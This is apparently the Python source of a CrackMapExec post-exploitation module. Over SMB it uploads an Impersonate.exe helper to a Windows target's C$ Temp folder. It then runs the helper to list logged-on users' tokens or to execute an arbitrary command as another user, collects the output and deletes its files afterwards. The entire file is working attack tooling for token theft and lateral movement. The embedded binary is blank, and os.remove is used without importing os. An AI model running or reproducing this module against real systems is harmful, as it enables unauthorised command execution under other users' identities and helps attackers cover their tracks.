from io import StringIO
import base64

class CMEModule:

    name = "impersonate"
    description = "List and impersonate tokens to run command as locally logged on users"
    supported_protocols = ["smb"]
    opsec_safe = True # could be flagged
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            TOKEN               Token ID to impersonate
            COMMAND             Command to execute
        '''

        self.tmp_dir = "C:\\Windows\\Temp\\"
        self.share = "C$"
        self.tmp_share = self.tmp_dir.split(":")[1]
        self.impersonate = "Impersonate.exe"
        self.impersonate_embedded = base64.b64decode("")

        self.token_id = self.command = ""
        if "TOKEN" in module_options and "COMMAND" in module_options:
            self.token_id = module_options['TOKEN']
            self.command = module_options['COMMAND']

    def on_admin_login(self, context, connection):

        with open("/tmp/Impersonate.exe", 'wb') as impersonate:
            impersonate.write(self.impersonate_embedded)

        context.log.info(f"Uploading {self.impersonate}")
        with open("/tmp/Impersonate.exe", 'rb') as impersonate:
            try:
                connection.conn.putFile(self.share, f"{self.tmp_share}{self.impersonate}", impersonate.read)
                context.log.success(f"File {self.impersonate} dropped on {self.share}{self.tmp_share}")
            except Exception as e:
                context.log.error(f"Error writing file to share {self.tmp_share}: {e}")
                return

        try:
            if not self.token_id and not self.command:
                command = f"{self.tmp_dir}Impersonate.exe"
                p = connection.execute(command, True)
                for line in p.splitlines():
                   token_id, token_type, token_owner = line.split(" ", 2)
                   context.log.highlight(f"Token ID: {token_id} {token_type} {token_owner}")
            else:
                command = f'{self.tmp_dir}Impersonate.exe {self.token_id} "{self.command}"'
                context.log.info(f"Running {command}")
                p = connection.execute(command, True)
                
                with open("/tmp/output_impersonate.txt", "wb+") as output_result:
                    try:
                        connection.conn.getFile(self.share, f"{self.tmp_share}output.txt", output_result.write)
                    except Exception as e:
                        context.log.error(f"Error retrieving result {self.share}: {e}")
                
                with open("/tmp/output_impersonate.txt", "r", encoding="cp1252") as output_result:
                    for line in output_result.read().splitlines():
                        context.log.highlight(line)
                os.remove("/tmp/output_impersonate.txt")
        
        except Exception as e:
            context.log.error(f"Error runing command: {e}")
        finally:
            try:
                connection.conn.deleteFile(self.share, f"{self.tmp_share}{self.impersonate}")
                if self.token_id and self.command:
                    connection.conn.deleteFile(self.share, f"{self.tmp_share}output.txt")
                context.log.success(f"Deleted Impersonate.exe and output.txt files on {self.share}")
            except Exception as e:
                context.log.error(f"Error deleting Impersonate.exe and output.txt files on {self.share}: {e}")
